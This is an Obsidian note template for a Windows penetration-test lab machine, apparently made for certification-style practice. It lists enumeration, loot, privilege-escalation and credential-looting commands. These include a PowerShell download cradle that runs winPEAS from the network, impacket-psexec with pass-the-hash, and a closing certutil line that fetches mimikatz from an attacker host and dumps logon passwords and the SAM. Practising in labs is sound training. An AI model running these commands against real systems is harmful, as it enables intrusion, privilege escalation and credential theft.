#show #windows
<%*
const path = tp.file.folder(true).split('/');
const filename = "0_" + path[path.length - 1];
await tp.file.rename(filename);
tR += "Part of " + "[" + "[" + "0_Lab_" + path[path.length - 2] + "]]";
-%>

Shell on system: ☑️
System pwned: ✅

# Enumeration
##### Enum4Linux
```bash
enum4linux -a $hip
```
If Null-Session is not restricted, also use `rpcclient -U "" -N $hip` with `querydispinfo` and `enumdomusers`. If used with proxy, use `proxychains -q`
##### Get SMB version
```bash
crackmapexec smb $hip 2>/dev/null
```
Alternativ: [grab_smbversion.sh](file:////home/kali/Documents/activeInformationGathering/)


# Initial Foothold

### Software Versions

	 `searchsploit` and Google Dorks

### Insecure configurations
> Use the service template to document possible attack vectors and document here which worked
> NSE scripts: `ls /usr/share/nmap/scripts`
> Run the following for all services: `nmap --script "safe and smb-*" $hip`. If nothing helps, try `nmap --script "smb-vuln-*" $hip`


# Loot

Hostname `hostname`
	

Flag `type C:\Users\Administrator\Desktop\proof.txt` or local.txt for non-elevated
	
##### Users
```powershell
Get-LocalUser
```
Alternative: `net user`
##### Network
```powershell
ipconfig /all; route print; netstat -ano; netsh advfirewall show currentprofile, netsh advfirewall firewall show rule name=all
```

##### Interesting files
```powershell
Get-ChildItem -Recurse -Path C:\Users\ -File -Exclude Desktop.lnk,Downloads.lnk,Bing.url | select Name,Directory; Get-ChildItem -Path C:\Users\ -Include *.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue; Get-History; type (Get-PSReadlineOption).HistorySavePath
```

##### Advanced
Mounted Volumes: `mountvol`
Devices: `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer`
Drivers: `driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object "Display Name", "Start Mode", "Path"`
Shadow Copy: `vssadmin list shadows`, `mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\`
# PrivEsc
##### Find Working Dir for attack
```powershell
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
	
##### WinPEAS
```bash
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1'); ./linpeash.ps1 -a -r | tee linpeas.txt
```
Read it with color-highlighting using `less -r linpeas.txt`

> I still have to run WinPEAS once and check what additional commands I need to integrate from [[2_loot-privEsc_Windows_Manually]]

##### Windows Exploit Suggester - Next Generation
On target, execute `systeminfo > systeminfo.txt` and transfer file. On kali, do
```bash
wes --muc-lookup systeminfo.txt
```

Consider [[3_dllHijacking_guide]]

Ways to login as another user:
- `impacket-psexec '$user:$password@$hip'` oder `impacket-psexec -hashes 00000000000000000000000000000000:$ntlm_hash '$user@$hip'`
- If we have access to the GUI -> `RunAs /user:$user cmd`
- User is in group _Remote Desktop Users_ -> RDP
- User is in group _Remote Management Users_ -> WinRM (Better use [evil-winrm](https://github.com/Hackplayers/evil-winrm) from non-interactive shells)
- User has _Log on as a batch job_ right -> Schedule task to execute a program of our choice as this user
- User has active session -> Use PsExec (SysInternals)

# Loot passwords
```powershell
certutil.exe -urlcache -split -f "http://192.168.45.IP:8000/mimikatz.exe" ; .\mimikatz.exe privilege::debug sekurlsa::logonpasswords lsadump::sam exit
```